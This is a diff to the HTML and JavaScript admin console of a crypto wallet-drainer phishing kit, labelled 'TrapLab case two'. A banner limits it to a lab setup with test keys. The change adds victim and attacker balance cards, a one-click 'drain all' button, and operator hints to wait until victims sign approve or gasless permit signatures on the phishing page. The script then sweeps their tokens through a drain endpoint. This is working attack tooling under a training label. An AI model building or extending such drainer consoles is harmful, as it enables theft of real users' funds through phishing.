@@ -9,10 +9,21 @@
   .banner { background:#3d1d1d; color:#ff9c9c; padding:8px 18px; font-size:12px; }
   h1 { font-size:16px; padding:14px 18px; color:#e8eef8; border-bottom:1px solid #1c2330;}
   h1 span { color:#5c8bff; }
-  main { display:grid; grid-template-columns: 1fr 1.2fr; gap:14px; padding:14px 18px; max-width:1200px; margin:0 auto;}
+  .cards { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; padding:0 18px; margin-top:14px; max-width:1280px;}
+  .kpi { background:#0f141d; border:1px solid #1e2635; border-radius:10px; padding:14px 16px;}
+  .kpi .lab { color:#7e8ba0; font-size:11.5px; letter-spacing:1px;}
+  .kpi .val { font-size:22px; font-weight:700; margin-top:6px; color:#e8eef8;}
+  .kpi .val.green { color:#5dff9c; } .kpi .val.red { color:#ff7a7a; }
+  .kpi .addr { color:#58637a; font-size:11px; margin-top:4px; word-break:break-all;}
+  .actions { display:flex; gap:10px; align-items:center; margin:12px 18px 0; max-width:1280px;}
+  .actions .drain-all { background:#254d33; color:#5dff9c; border:1px solid #2f6b44; border-radius:8px; padding:9px 22px; cursor:pointer; font-size:14px; font-weight:700; font-family:inherit;}
+  .actions .drain-all:hover { background:#316644; }
+  .actions .drain-all[disabled] { opacity:.4; cursor:default; }
+  .actions .hint { color:#7e8ba0; font-size:12.5px; line-height:1.5;}
+  main { display:grid; grid-template-columns: 1fr 1.2fr; gap:14px; padding:12px 18px 24px; max-width:1280px; margin:0 auto;}
   .panel { background:#0f141d; border:1px solid #1e2635; border-radius:10px; overflow:hidden;}
   .panel h2 { font-size:12.5px; color:#7e8ba0; padding:10px 14px; border-bottom:1px solid #1a2130; letter-spacing:1px;}
-  #log { height:420px; overflow-y:auto; padding:10px 14px; }
+  #log { height:400px; overflow-y:auto; padding:10px 14px; }
   #log div { padding:3px 0; border-bottom:1px dashed #161d29; }
   #log .t { color:#58637a; margin-right:8px; }
   .k-connect { color:#7ec8ff; } .k-approve { color:#ffd479; } .k-permit { color:#c79bff; }
@@ -24,17 +35,33 @@
   button.drain { background:#254d33; color:#5dff9c; border:1px solid #2f6b44; border-radius:6px; padding:5px 14px; cursor:pointer; font-family:inherit;}
   button.drain:hover { background:#316644; }
   button.drain[disabled] { opacity:.4; cursor:default; }
-  .detail { color:#58637a; font-size:11.5px; margin-top:3px; }
-  #empty { color:#58637a; padding:14px; }
+  .detail { color:#58637a; font-size:11.5px; margin-top:3px; word-break:break-all;}
+  .empty { color:#7e8ba0; padding:20px 14px; line-height:1.8;}
+  .empty b { color:#ffd479; }
 </style>
 </head>
 <body>
 <div class="banner">⚠ TrapLab 案例二 · 仅限自有内网实验室演练(Anvil 测试链 + 公开测试私钥,零真实资产)——严禁用于任何真实环境</div>
 <h1>钓鱼实验室 · <span>收割台</span></h1>
+
+<div class="cards">
+  <div class="kpi"><div class="lab">受害者(最近连接)</div>
+    <div class="val red" id="victimBal">—</div><div class="addr" id="victimAddr">尚无受害者上线</div></div>
+  <div class="kpi"><div class="lab">攻击者余额</div>
+    <div class="val green" id="attackerBal">—</div><div class="addr" id="attackerAddr"></div></div>
+  <div class="kpi"><div class="lab">待收割 / 已收割</div>
+    <div class="val" id="itemCount">0 / 0</div><div class="addr">代币:<span id="symbol">—</span></div></div>
+</div>
+
+<div class="actions">
+  <button class="drain-all" id="drainAll" disabled>⚡ 一键收割全部待收割项</button>
+  <div class="hint" id="hint">等待受害者上线。他们一旦在钓鱼页点「领取」并签名,待收割清单会立即出现条目。</div>
+</div>
+
 <main>
   <div class="panel">
     <h2>实时事件流</h2>
-    <div id="log"><div id="empty">等待受害者上线…</div></div>
+    <div id="log"><div class="empty">等待受害者上线…</div></div>
   </div>
   <div class="panel">
     <h2>待收割清单</h2>
@@ -42,7 +69,12 @@
       <thead><tr><th>#</th><th>类型 / 受害者</th><th>状态</th><th>操作</th></tr></thead>
       <tbody id="items"></tbody>
     </table>
-    <div id="noitems" style="color:#58637a;padding:14px;">暂无待收割项——等受害者签署授权或 permit 后自动出现</div>
+    <div class="empty" id="noitems">
+      暂无待收割项。<br>
+      <b>下一步:</b>受害者已连接钱包但还没签名——<br>
+      等他们在钓鱼页点「<b>立即领取</b>」(approve 授权)或「<b>免 Gas 领取</b>」(permit 签名),
+      这里会立刻出现可收割的条目。
+    </div>
   </div>
 </main>
 <script>
@@ -50,20 +82,38 @@ const KEY = new URLSearchParams(location.search).get("key");
 const $ = id => document.getElementById(id);
 const fmt = n => Number(n).toLocaleString("en-US");
 const short = a => a ? a.slice(0,8) + "…" + a.slice(-6) : "?";
+const KINDS = ["connect","approve","permit","drain"];
 
 async function refresh() {
   try {
-    const state = await (await fetch(`/admin/api/state?key=${KEY}`)).json();
-    const log = $("log");
-    log.innerHTML = state.events.length ? state.events.map(e =>
+    const s = await (await fetch(`/admin/api/state?key=${KEY}`)).json();
+    // KPI
+    $("symbol").textContent = s.meta?.symbol || "—";
+    $("attackerBal").textContent = fmt(s.balances?.attacker || 0);
+    $("attackerAddr").textContent = short(s.meta?.attacker);
+    if (s.balances?.victim) {
+      $("victimBal").textContent = fmt(s.balances.victim.amount);
+      $("victimAddr").textContent = s.balances.victim.address;
+    }
+    const pending = s.items.filter(i => i.status === "pending");
+    $("itemCount").textContent = `${pending.length} / ${s.items.length - pending.length}`;
+    $("drainAll").disabled = pending.length === 0;
+    // 空态指引
+    if (!s.items.length) {
+      const hasConnect = s.events.some(e => e.kind === "connect");
+      $("hint").innerHTML = hasConnect
+        ? "受害者已连接钱包但<b>还没签名</b>——等他点「立即领取」或「免 Gas 领取」。"
+        : "等待受害者上线。他们一旦签名,待收割清单会立即出现条目。";
+    } else $("hint").textContent = "";
+    // 事件流
+    $("log").innerHTML = s.events.length ? s.events.map(e =>
       `<div><span class="t">${new Date().toLocaleTimeString()}</span>` +
       `<span class="k-${e.kind}">[${e.kind}]</span> ${e.text}</div>`).reverse().join("")
-      : '<div id="empty">等待受害者上线…</div>';
-    const items = state.items.filter(i => i.status === "pending");
-    $("noitems").style.display = state.items.length ? "none" : "block";
-    $("items").innerHTML = state.items.map(i => {
-      const type = i.type === "approve"
-        ? `授权 ${fmt(i.amount)}` : `permit ${fmt(i.value)}`;
+      : '<div class="empty">等待受害者上线…</div>';
+    // 清单
+    $("noitems").style.display = s.items.length ? "none" : "block";
+    $("items").innerHTML = s.items.map(i => {
+      const type = i.type === "approve" ? `授权 ${fmt(i.amount)}` : `permit ${fmt(i.value)}`;
       return `<tr>
         <td>${i.id}</td>
         <td>${type}<div class="detail">${short(i.victim)}</div></td>
@@ -75,20 +125,33 @@ async function refresh() {
     }).join("");
   } catch (e) { console.error(e); }
 }
-document.addEventListener("click", async ev => {
-  const btn = ev.target.closest("button.drain");
-  if (!btn) return;
-  btn.disabled = true; btn.textContent = "收割中…";
-  const resp = await (await fetch(`/admin/api/drain?key=${KEY}`, {
-    method:"POST", headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({ itemId: Number(btn.dataset.id) }),
-  })).json();
-  if (resp && resp.drained !== undefined) {
-    btn.textContent = `✓ +${fmt(resp.drained)}`;
-  } else {
-    btn.textContent = resp && resp.error ? "✗ " + resp.error : "✗ 失败";
+
+async function drain(ids, btn) {
+  btn.disabled = true;
+  const results = [];
+  for (const id of ids) {
+    const resp = await (await fetch(`/admin/api/drain?key=${KEY}`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ itemId: id }),
+    })).json();
+    results.push(resp);
   }
   refresh();
+  return results;
+}
+
+document.addEventListener("click", async ev => {
+  const btn = ev.target.closest("button.drain");
+  if (btn && btn.dataset.id) {
+    btn.disabled = true; btn.textContent = "收割中…";
+    const [resp] = await drain([Number(btn.dataset.id)], btn);
+    btn.textContent = resp && resp.drained !== undefined ? `✓ +${fmt(resp.drained)}` : "✗ 失败";
+  } else if (ev.target.closest("#drainAll")) {
+    const s = await (await fetch(`/admin/api/state?key=${KEY}`)).json();
+    const ids = s.items.filter(i => i.status === "pending").map(i => i.id);
+    await drain(ids, $("drainAll"));
+    $("drainAll").textContent = ids.length ? `✓ 已收割 ${ids.length} 项` : "无可收割项";
+  }
 });
 refresh();
 setInterval(refresh, 2000);
